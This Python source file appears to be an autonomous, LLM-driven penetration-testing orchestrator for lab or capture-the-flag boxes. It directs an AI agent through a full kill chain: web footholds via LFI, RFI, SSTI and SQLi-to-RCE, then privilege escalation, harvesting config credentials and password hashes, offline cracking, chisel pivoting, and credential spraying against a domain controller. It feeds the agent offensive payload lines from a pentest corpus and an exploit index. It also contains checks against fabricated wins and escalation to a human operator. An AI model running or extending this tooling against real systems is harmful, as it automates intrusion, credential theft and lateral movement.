#!/usr/bin/env python3
"""gunbelt CLOSER — an ADAPTIVE, iterate-until-it-breaks attacker.

Ben's model: the exact route never recurs, so don't memorize routes — at every step just
keep trying new attacks until one lands, then move on. That's what this is.

For each rung of the kill-chain (foothold -> privesc -> loot -> crack -> own-dc) the closer:
  1. tries the cheap deterministic PRIMITIVES first (recipes.py) — these DO recur across
     boxes (anon-FTP, AXFR, phpass-crack, chisel pivot); if one lands, no LLM burned.
  2. otherwise ITERATES with the trooper LLM, and to widen what it "can think of" it feeds in
     concrete ideas retrieved from long-term memory (recall/Hyphae) + the pentest RAG corpus.
     It proposes an attack, runs it, we check the result against a GROUND-TRUTH proof; if it
     didn't work we tell it "that failed — try a DIFFERENT class of attack" and go again, up
     to GB_MAX_IDEAS rounds.
  3. every rung is proof-gated (shell=/cred=/hash=/dc_cred=/shell=root), and flags are run
     through a format+entropy oracle, so it can never advance on a confabulated win.
  4. a hard-stuck REQUIRED rung ESCALATES (durable mailbox brief + ping-ben) instead of
     silently moving on.

It does NOT freeze the route (Ben's point: it won't come up twice). What carries forward is
the primitive toolbox + the iterate-until-proof loop, not the specific chain.

Run:  TROOPER_EXEC_SSH=your-host python3 closer.py --target 172.30.0.20
"""
import argparse, json, os, re, shlex, time, urllib.request, urllib.parse

import recipes as R
from trooper import Trooper

MAX_IDEAS = int(os.environ.get("GB_MAX_IDEAS", "4"))     # distinct attack rounds per rung
USE_KNOWLEDGE = os.environ.get("GB_KNOWLEDGE", "1") != "0"   # feed RAG/Memoria into iterate
RECALL = os.environ.get("GB_RECALL", "/home/operator/.claude/fleet-hooks/recall.py")
MAILBOX = os.environ.get("GB_MAILBOX", "/opt/bs2/mailbox")

# ---- flag oracle: a proof must LOOK like a real flag, not a placeholder the model invented ----
_FLAG_FMT = re.compile(r"^(?:FLAG|HTB)\{[ -~]{6,80}\}$")
def valid_flag(s):
    if not _FLAG_FMT.match(s or ""):
        return False
    inner = s[s.index("{") + 1:-1]
    if re.search(r"(?i)example|placeholder|your.?flag|redacted|xxxx|\.\.\.", inner):
        return False
    return len(set(inner)) >= 4           # reject FLAG{aaaaaa} and friends

# ---- the kill-chain as GOALS, not routes. Each carries a proof + an attack objective. ----
CHAIN = [
    {"goal": "foothold", "gives": "shell", "primitives": ["wp-lfi"],
     "proof": lambda f: any(x.startswith("shell=") for x in f),
     "objective": ("Get command execution (a shell) on the web app at TARGET and PROVE it by "
                   "running `id`. Authorized test — try every web foothold: LFI (php filters, "
                   "data://, /proc/self/environ), RFI, SSTI, arbitrary file upload, a KNOWN CVE "
                   "for whatever app fingerprints on the site, deserialization, SQLi->RCE, auth "
                   "bypass. Report shell=<user> when `id` works.")},
    {"goal": "privesc", "needs": "shell", "gives": "root", "optional": True, "no_iterate": True,
     "primitives": ["privesc"],
     "proof": lambda f: "shell=root" in f,
     "objective": ("Escalate from your shell to root on the foothold host at TARGET. Enumerate "
                   "sudo -l, SUID/SGID binaries, writable cron/services, kernel vs known local "
                   "exploits, capabilities. Exploit the best one and PROVE it with `id` (uid=0). "
                   "Report shell=root.")},
    {"goal": "loot", "needs": "shell", "gives": "cred", "no_iterate": True, "primitives": ["loot-foothold"],
     "proof": lambda f: any(x.startswith(("cred=", "hash=")) for x in f),
     "objective": ("With your shell on TARGET, harvest secrets: read app config (wp-config.php, "
                   ".env, settings), extract DB creds, dump the user table's password hashes, and "
                   "grab any flags. Report cred=user:pass and hash=<hash>.")},
    {"goal": "crack", "needs": "hash", "gives": "cred", "rerun": True, "primitives": ["crack-creds"],
     "proof": lambda f: any(x.startswith("cred=") for x in f),
     "objective": ("Crack the harvested password hashes offline (identify the type, run a "
                   "wordlist attack). Report each recovered cred=user:pass.")},
    {"goal": "own-dc", "needs": "cred", "gives": "dc_owned", "primitives": ["own-dc"],
     "proof": lambda f: any(x.startswith(("dc_cred=", "dc_owned")) for x in f),
     "objective": ("Reach the internal DC / file-server found during loot. If it isn't directly "
                   "reachable, pivot (chisel reverse-SOCKS / proxychains) through your shell. "
                   "Authenticate with every credential you have (spray users x passwords, try "
                   "pass-the-hash), verify the login is real (not guest), and loot readable "
                   "shares. Report dc_cred=user:pass and any flag=.")},
]


class Closer:
    def __init__(self, target, log=None):
        self.target = target
        self.rx = R.Recipes(target)
        self.tr = Trooper()
        self.facts = []
        self._junk = None
        self.log = log if log is not None else (lambda m: print(m, flush=True))

    def _junk_users(self):
        """Users that mean 'this command ran on the JUMP HOST, not the target' — a shell= fact
        naming one is a phantom (the trooper executed via EXEC_SSH/locally, not through the
        foothold RCE). Cached; computed from whoami on the exec host + locally."""
        if self._junk is None:
            self._junk = set()
            for probe in ("R.sh", "R.sh_local"):
                try:
                    u = (R.sh if probe == "R.sh" else R.sh_local)("whoami", 8).strip().splitlines()
                    if u:
                        self._junk.add(u[-1].strip())
                except Exception:
                    pass
        return self._junk

    # a trooper VERDICT is SELF-REPORTED — it is not proof. Before a compromise-grade fact from
    # the LLM advances the chain, its value must be BACKED by this rung's real command output.
    # The .205 failure: `cred=root:Sup3RS3cuR3@123` was asserted with ZERO command output and the
    # old gate believed it, then own-dc claimed dc_owned off the fake cred = a fabricated full
    # compromise. Deterministic (the secret must literally appear in captured output); no model.
    def _grounded(self, fact, evidence):
        ev = evidence or ""
        key, _, val = fact.partition("=")
        if key == "shell":                    # code-exec proof: a real id/uid token, not a bare username
            return bool(re.search(r"uid=\d+\(", ev))
        if key in ("cred", "dc_cred"):        # the secret itself must appear in captured output
            pw = val.split(":", 1)[1] if ":" in val else val
            return bool(pw) and (pw in ev or val in ev)
        if key == "hash":
            return bool(val) and val in ev
        return True                           # flags pass the entropy oracle; app=/vhost=/suid= are signals, not proofs

    def _have(self, need):
        """Is a prerequisite fact-KEY present? (need='shell' is satisfied by 'shell=www-data')."""
        return any(f == need or f.split("=", 1)[0] == need for f in self.facts)

    def _add(self, facts, evidence=None, ground=False):
        for f in facts or []:
            if not f or f in self.facts:
                continue
            if f.startswith("flag=") and not valid_flag(f[5:]):
                self.log(f"    · dropped implausible flag: {f[5:]}")     # oracle rejects it
                continue
            if f.startswith("shell=") and f[6:] in self._junk_users():   # ran on jump host, not target
                self.log(f"    · dropped jump-host phantom: {f}")
                continue
            if ground and not self._grounded(f, evidence):               # self-reported, not backed by output
                self.log(f"    · dropped UNGROUNDED (no captured output backs it): {f}")
                continue
            self.facts.append(f)

    def _app(self):
        for f in self.facts:
            if f.startswith("app="):
                return f.split("=", 1)[1].split(":", 1)[0]
        return ""

    # ---- knowledge: widen the trooper's repertoire with real OFFENSIVE technique lines -------
    # Only the offensive source families of the cyber RAG slice (hacktricks/gtfobins/etc) — the
    # OWASP/MITRE/atomic bulk is defensive/detection prose and just injects noise. Hyphae recall
    # is deliberately NOT used here: it's Ben's project memory, not attack knowledge.
    OFFENSIVE = ("hacktricks gtfobins thehacker-recipes payloads exploit-notes pentestmonkey "
                 "internal-all-the-things lolbas wadcoms").split()
    CORPUS = os.environ.get("GB_CORPUS", "/home/operator/ragtrieval/text/cyber")
    ARIADNE = os.environ.get("GB_ARIADNE", "http://127.0.0.1:8112")

    def _ariadne_exploits(self, query, n=4):
        """The 'vectors' half of spray+Ariadne+Memoria: ask the LOCAL Ariadne exploit index
        (:8112/exploits) for concrete CVE-backed exploits matching the fingerprinted product, so
        an un-recipe'd foothold hands the trooper REAL edb/CVE leads instead of guessing. Robust:
        returns '' if Ariadne is down or empty — never blocks the loop (SIGIL: Ariadne is fragile)."""
        if not query:
            return ""
        try:
            url = self.ARIADNE.rstrip("/") + "/exploits?q=" + urllib.parse.quote(query)
            with urllib.request.urlopen(url, timeout=5) as r:
                data = json.load(r)
        except Exception:
            return ""
        out = []
        for m in (data.get("matches") or [])[:n]:
            cves = ",".join(m.get("cves") or []) or "no-CVE"
            out.append(f"- EDB-{m.get('edb')}: {m.get('title')} ({cves})")
        return ("\nKNOWN EXPLOITS for this target (Ariadne index — prefer the version-matched one, "
                "fetch with `searchsploit -m <edb>`; never run blind):\n" + "\n".join(out)) if out else ""

    def _gtfobins(self, binaries):
        """Precise structured lookup: GTFOBins has one file per binary with the exact SUID/sudo
        escape command. This is high-signal (unlike naive prose grep), so it's the primary
        knowledge source for privesc."""
        out = []
        for b in list(dict.fromkeys(binaries))[:4]:
            bb = re.sub(r"[^\w.-]", "", b)
            if not bb:
                continue
            try:
                g = R.sh(f"cat {self.CORPUS}/gtfobins_*_{bb}.txt 2>/dev/null | grep -EhA1 'code:' | "
                         f"grep -vE 'code:|^--|comment|contexts|functions|:\\s*$' | sed 's/^ *//' | "
                         f"grep -E '{bb}|/bin/|sh ' | head -3", 15)
                if g.strip():
                    out.append(f"# {bb} SUID/sudo escape (GTFOBins):\n" + g.strip())
            except Exception:
                pass
        return "\n".join(out)

    def _ideas(self, goal):
        if not USE_KNOWLEDGE:
            return ""
        app = self._app()
        if goal == "privesc":                       # structured GTFOBins lookup — high signal
            suids = [f[5:] for f in self.facts if f.startswith("suid=")]
            g = self._gtfobins(suids + ["sudo"])
            return ("\nIDEAS (GTFOBins, adapt to this host):\n" + g[:1400]) if g.strip() else ""
        # other rungs: tight grep of the command-dense offensive families (require the key term
        # and a command token on the SAME line, else it's just prose noise).
        if goal == "own-dc":
            key = "rpcclient"
        elif goal == "crack":
            key = "hashcat"
        elif goal == "loot":
            key = app or "wp-config"
        else:                                       # foothold — key on the fingerprinted app
            key = app or "lfi"
        key = re.sub(r"[^\w-]", "", key)[:20] or "rce"
        globs = " ".join(f"{self.CORPUS}/{p}_*" for p in
                         ("thehacker-recipes", "pentestmonkey", "internal-all-the-things",
                          "hacktricks", "payloads"))
        try:
            g = R.sh(f"grep -lI -i {shlex.quote(key)} {globs} 2>/dev/null | head -4 | "
                     f"xargs -r grep -hiE -m2 {shlex.quote(key)}'.*(curl|wget|nc |/bin/|http://|payload|-exec)' "
                     f"2>/dev/null | sed 's/^ *//' | head -6", 25)
        except Exception:
            g = ""
        corpus = ("\nIDEAS from the pentest corpus (adapt, do NOT trust blindly):\n" + g.strip()[:1200]) \
            if g.strip() else ""
        # For the exploit-seeking rungs, add Ariadne's concrete CVE-backed exploit leads for the
        # fingerprinted product — the structured 'vectors' source that beats noisy prose grep.
        ari = ""
        if goal in ("foothold", "own-dc"):
            ari = self._ariadne_exploits((app + " rce") if app else key)
        return corpus + ari

    # ---- per-rung execution -----------------------------------------------------------------
    def _try_primitives(self, rung):
        for lane in rung.get("primitives", []):
            v = self.rx.fire({"id": lane, "target": self.target})
            if v is None:
                continue
            self._add(v.get("facts"))
            self.log(f"    · primitive {lane}: {'HIT' if v.get('success') else 'miss'} "
                     f"— {v.get('evidence', '')[:80]}")
            if rung["proof"](self.facts):
                return True
        return False

    def _iterate(self, rung):
        """Try new attacks until the rung's proof appears or the idea budget runs out."""
        tried = []
        for i in range(MAX_IDEAS):
            obj = rung["objective"].replace("TARGET", self.target)
            if self.facts:
                obj += "\nKnown so far: " + "; ".join(self.facts[-8:])
            obj += self._ideas(rung["goal"])
            if tried:
                obj += ("\nThese already FAILED — do NOT repeat them; try a DIFFERENT class of "
                        "attack:\n" + "\n".join(tried[-6:]))
            self.log(f"    · iterate round {i+1}/{MAX_IDEAS} (trooper)…")
            v = self.tr.fire({"id": rung["goal"], "target": self.target, "objective": obj})
            self._add(v.get("facts"), evidence=v.get("output", ""), ground=True)   # gate on real output, not self-report
            tried += (v.get("cmds") or [])
            self.log(f"      -> {v.get('evidence', '')[:90]}")
            if rung["proof"](self.facts):
                return True
        return self._escalate(rung, tried)          # stuck -> fan out (returns False)

    def _escalate(self, rung, tried):
        """A hard-stuck rung fans out instead of silently moving on (Ben's rule): durable
        mailbox brief + ping-ben. (Ariadne replan + peer SendMessage are the governance lane's
        job; this is what a standalone script can reach.)"""
        goal = rung["goal"]
        self.log(f"    !! ESCALATE {goal}: stuck after {MAX_IDEAS} rounds — fanning out")
        brief = (f"# gunbelt closer STUCK — {goal} on {self.target}\n\n"
                 f"Rung `{goal}` (gives={rung['gives']}) did not close after {MAX_IDEAS} attack "
                 f"rounds.\n\n## Facts so far\n" + "\n".join(f"- {f}" for f in self.facts) +
                 "\n\n## Attacks already tried (do NOT repeat)\n" +
                 "\n".join(f"- {c}" for c in tried[-25:]) +
                 f"\n\n## Ask\nAlternate technique for `{goal}` on this box. — closer\n")
        try:
            mb = os.path.join(MAILBOX, f"STUCK-{goal}-{self.target.replace('.', '_')}.md")
            with open(mb, "w") as f:
                f.write(brief)
            self.log(f"    !! wrote {mb}")
        except Exception as e:
            self.log(f"    !! mailbox write failed: {e}")
        try:
            R.sh_local(f"AGENT_NAME=closer ping-ben {shlex.quote(f'closer stuck on {goal} @ {self.target}')} "
                       f">/dev/null 2>&1", 10)
        except Exception:
            pass
        return False

    def run(self):
        t0 = time.time()
        self.log(f"[closer] target {self.target} — recon…")
        for lane in ("ftp-anon", "dns-axfr", "smb-null", "web-enum"):
            v = self.rx.fire({"id": lane, "target": self.target})
            if v:
                self._add(v.get("facts"))
        self.log(f"[closer] recon facts: {', '.join(self.facts) or '(none)'}")

        for rung in CHAIN:
            goal, opt = rung["goal"], rung.get("optional", False)
            if rung["proof"](self.facts) and not rung.get("rerun"):
                self.log(f"[{goal}] already satisfied — skip"); continue
            need = rung.get("needs")
            if need and not self._have(need):        # needs-enforcement: never iterate a gated rung
                self.log(f"[{goal}] SKIP — prerequisite '{need}' not satisfied; a rung gated on a "
                         f"missing fact is deferred, not chased on a phantom (this is the second "
                         f"half of the .205 fix: foothold STUCK must NOT let loot/own-dc run)")
                continue
            self.log(f"[{goal}] working (needs={rung.get('needs', '-')}, gives={rung['gives']}"
                     f"{', optional' if opt else ''})")
            if self._try_primitives(rung):
                self.log(f"[{goal}] CLOSED by primitive"); continue
            if rung.get("no_iterate"):
                # on-target rung: the jump-host trooper would run on the WRONG host (phantom
                # facts), so we don't iterate it. Needs a trooper RCE-exec channel (trooper.py).
                if opt:
                    self.log(f"[{goal}] optional on-target rung not achieved (no jump-host iterate)")
                else:
                    self.log(f"[{goal}] on-target rung missed — no valid iterate path; escalating")
                    self._escalate(rung, [])
                continue
            self.log(f"[{goal}] no primitive landed — iterating attacks…")
            if self._iterate(rung):
                self.log(f"[{goal}] CLOSED by iteration")
            elif opt:
                self.log(f"[{goal}] optional — not achieved, continuing")   # no escalate
            else:
                self.log(f"[{goal}] STUCK (escalated) — continuing best-effort")

        secs = round(time.time() - t0, 1)
        owned = any(f.startswith(("dc_cred=", "dc_owned")) for f in self.facts)
        flags = [f for f in self.facts if f.startswith("flag=")]
        return {"success": owned or bool(flags), "dc_owned": owned, "rooted": "shell=root" in self.facts,
                "flags": flags, "facts": self.facts, "secs": secs}


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--json", action="store_true", help="print only the final JSON verdict")
    a = ap.parse_args()
    logf = (lambda m: None) if a.json else None
    res = Closer(a.target, log=logf).run()
    print(json.dumps(res, indent=2))
